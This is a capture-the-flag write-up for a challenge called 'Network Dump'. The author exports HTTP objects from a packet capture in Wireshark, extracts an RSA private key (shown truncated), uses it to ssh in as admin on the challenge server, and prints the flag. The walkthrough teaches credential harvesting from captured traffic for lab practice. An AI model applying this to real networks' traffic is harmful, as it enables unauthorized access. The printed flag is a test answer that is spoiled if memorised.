# Network Dump
**_Web exploitation_** \
Difficulty: Medium

### 1. Log onto the server using ssh with the provided password
In the first step we simply want to look around.
```sh
[student@b6800923ac04 ~]$ ls
dump.pcapng
[student@b6800923ac04 ~]$ cd ..
[student@b6800923ac04 home]$ ls
admin   student
```
Obviously we don't have permission to access `admin` directory.. However, it's still a very useful information.

### 2. Open the provided .pcapng file with Wireshark

### 3. Export all the objects sent using the HTTP protocol\
File > Export Objects > HTTP... > Save All

### 4. Find the private RSA key in exported objects
This key is very clearly indicated by the following scheme:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuAsNBPiOFSUULoNlc5SnrY01H5Ma/ (...)
-----END RSA PRIVATE KEY-----
```
Now save this key as a seperate file.

### 5. Use that key to log into the server as `admin` user
```sh
chmiela@localhost:~> chmod 600 id_rsa
chmiela@localhost:~> ssh -i id_rsa -p 10495 admin@container-manager.francecentral.cloudapp.azure.com
[admin@b6800923ac04 ~]$ ls
FLAG
[admin@b6800923ac04 ~]$ cat FLAG
EE_CTF{TRZ3BA_BYLO_N13_ISC_NA_STUDIA_TYLKO_DO_UCZCIW3J_PRACY}
```

### 6. Result
Flag: `EE_CTF{TRZ3BA_BYLO_N13_ISC_NA_STUDIA_TYLKO_DO_UCZCIW3J_PRACY}`